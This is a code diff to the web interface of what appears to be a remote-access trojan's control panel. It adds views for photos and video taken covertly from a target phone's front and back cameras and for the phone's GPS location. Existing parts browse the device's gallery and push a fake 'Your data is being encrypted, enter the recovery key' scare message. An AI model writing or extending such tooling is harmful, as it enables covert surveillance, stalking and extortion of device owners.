@@ -102,7 +102,6 @@
             const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
             const curHash = JSON.stringify(d[curMod] || d.media || d.location || d.info || "");
             
-            // Bypass hash check for contacts to ensure display
             if(curMod !== 'contacts' && hash === curHash) return; 
             hash = curHash;
             b.innerHTML = ""; f.innerHTML = "";
@@ -160,6 +159,24 @@
                 const g = d.gallery;
                 b.innerHTML = `<div class="gal-grid">${g.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${x.name}</p></div>`).join('')}</div>`;
                 f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span style="color:var(--primary)">PAGE ${g.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
+            } else if(curMod === 'takebackpic' || curMod === 'takefrontpic' || curMod === 'record_back' || curMod === 'record_front') {
+                const m = d.media;
+                if(m.last_img || m.last_vid) {
+                    const isVid = m.last_vid && curMod.includes('record');
+                    const src = isVid ? m.last_vid : m.last_img;
+                    const isDirect = m.is_direct && !isVid;
+                    b.innerHTML = `<div style="text-align:center;">
+                        ${isVid ? `<video src="/captured_images/${src}" controls style="width:100%"></video>` : 
+                        `<img src="${isDirect ? 'data:image/jpeg;base64,'+src : '/captured_images/'+src}" style="width:100%; border-radius:15px; border:1px solid var(--primary); box-shadow:0 0 20px rgba(0,255,195,0.2);">`}
+                        <br><button class="red-btn" style="margin-top:15px; width:100%; padding:12px;" onclick="closeModal()">OK, UNDERSTOOD (DISMISS)</button>
+                    </div>`;
+                } else b.innerHTML = `<div style="text-align:center; padding:30px;"><i class="fas fa-spinner fa-spin" style="font-size:2rem; color:var(--primary); margin-bottom:15px;"></i><p>${m.status || 'Initiating camera capture...'}</p></div>`;
+            } else if(curMod === 'get_location') {
+                const loc = d.location;
+                if(loc.url) {
+                    b.innerHTML = `<div style="text-align:center;">${loc.img?`<img src="${loc.img}" style="width:100%; border-radius:15px; margin-bottom:10px;">`:''}<p style="font-size:0.8rem">${loc.url}</p><br><a href="${loc.url}" target="_blank"><button>Google Maps</button></a></div>`;
+                } else b.innerHTML = `<p style="text-align:center">Waiting GPS Koordinat...</p>`;
+                f.innerHTML = `<button onclick="cmd('get_location')">REFRESH</button><button class="red-btn" onclick="cmd('stop_location')">STOP</button>`;
             } else if(curMod === 'toast') {
                 b.innerHTML = `<p style="margin-bottom:5px; color:var(--dim)">System Message:</p>
                                <textarea id="lmsg" style="background:#1a2525; border:1px solid #3b5e5e; padding:10px; border-radius:15px; color:#fff; width:100%; height:120px; resize:none;">SYSTEM CRITICAL ERROR\nYour data is being encrypted.\nPlease enter the recovery key.</textarea>
